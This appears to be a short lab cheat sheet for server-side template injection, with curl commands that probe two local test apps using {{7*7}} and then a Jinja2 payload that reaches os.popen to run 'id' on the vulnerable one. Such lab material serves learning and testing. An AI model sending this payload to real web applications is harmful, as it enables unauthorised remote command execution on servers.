# ssti-lab

# Recon
curl "http://localhost:3001/?name={{7*7}}"   # → Hello 49   (vuln)
curl "http://localhost:3002/?name={{7*7}}"   # → Hello {{7*7}} (safe)

# RCE
curl "http://localhost:3001/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"